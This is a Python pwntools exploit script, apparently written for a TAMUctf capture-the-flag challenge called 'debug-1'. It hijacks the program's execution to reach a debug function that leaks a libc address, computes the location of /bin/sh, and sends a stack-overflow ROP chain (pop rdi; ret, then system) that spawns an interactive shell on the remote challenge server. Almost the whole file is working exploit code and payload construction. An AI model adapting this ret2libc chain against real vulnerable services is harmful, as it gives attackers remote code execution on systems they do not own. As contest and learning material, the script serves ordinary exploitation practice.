"""
RazviOverflow

Exploit idea:
    1. Hijack execution flow to call `debug` funciton.
    2. Select '1' because it leaks a system's libc dynamic address.
    3. Compute dynamic /bin/sh address (offset).
    4. Craft pop rdi; ret; @/bin/sh; system
    5. Exploit for fun and profit.
"""

from pwn import *
import sys

def debug(p):
    pid = util.proc.pidof(p)[0] 
    print("The pid is " + str(pid)) 
    util.proc.wait_for_debugger(pid)

context.binary = binary = ELF("./debug-1_patched") # Patched with pwninit
libc = ELF("./libc.so.6")
context.log_level = "debug"
#p = process(env={"LD_LIBRARY_PATH" : "libc.so.6"})
#p = process()

p = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_debug-1")


if len(sys.argv) > 1 and sys.argv[1] == '-d':
    debug(p)

static_system_address = libc.symbols.system
main_address = binary.symbols.main
debug_address = binary.symbols.debug
#data_section_address = binary.symbols.data_start

p.recvuntil(b"3: Exit")
p.sendline(b"1") # Select modify

def flip_case_bytestring(b):
    print(b)
    data = bytearray(b)  # convert to mutable
    for i in range(len(data)):
        if 97 <= data[i] <= 122:       # a-z
            data[i] -= 32              # to A-Z
        elif 65 <= data[i] <= 90:      # A-Z
            data[i] += 32              # to a-z
    print(bytes(data))
    return bytes(data)  # convert back to immutable bytes
p.recvuntil(b"):")

# 1st write happens with read @ *buf (pointer to argument passed from menu function)
# and that's @ stack-0x58 from menu's perspective
#payload = b"A" * 0x8 
#payload += b"B" * 0x8
#payload += b"C" * 0x8
#payload += b"D" * 0x8
#payload += b"E" * 0x8
#payload += b"F" * 0x8
#payload += b"G" * 0x8
#payload += b"H" * 0x8
#payload += b"I" * 0x8
#payload += b"J" * 0x8
#payload += b"K" * 0x8
payload = p64(0x00404000+0x60) * 11
#payload = b"\x00"*0x58
#payload += p64(0x0040142c)
payload += p64(debug_address+1) # +1 because rsp is not aligned, so we just skip the instruction
#p.sendline(flip_case_bytestring(payload))
p.sendline(payload)

p.sendline(b"1") #Print info from 

p.recvuntil(b"leak: ")
dynamic_system_address = int(p.recv().split(b"Leave")[0].strip(), 16)
print(hex(dynamic_system_address))

static_dynamic_offset = dynamic_system_address - static_system_address
#dynamic_bin_sh_address = static_bin_sh_address + dynamic_system_address

print(f"Previous libc address: {hex(libc.address)}")
libc.address = static_dynamic_offset
print(f"New libc address: {hex(libc.address)}")

bin_sh_address = next(libc.search(b"/bin/sh\x00"))

print(f"Dynamic system address {hex(dynamic_system_address)}")
print(f"Static system address {hex(static_system_address)}")
print(f"Dynamic offset {hex(static_dynamic_offset)}")
print(f"bin_sh address {hex(bin_sh_address)}")

# 0x000000000040154b : pop rdi ; ret
#0x0000000000401016 : ret

# buf is at stack-0x68
payload = b"A" * 0x68
payload += p64(0x000000000040154b)
payload += p64(bin_sh_address)
#payload += p64(0x0000000000401016)
payload += p64(dynamic_system_address)

p.sendline(payload)

#p.sendline(b"3")
p.interactive(prompt=">>>>>")
#print(p.recvuntil(b")!"))

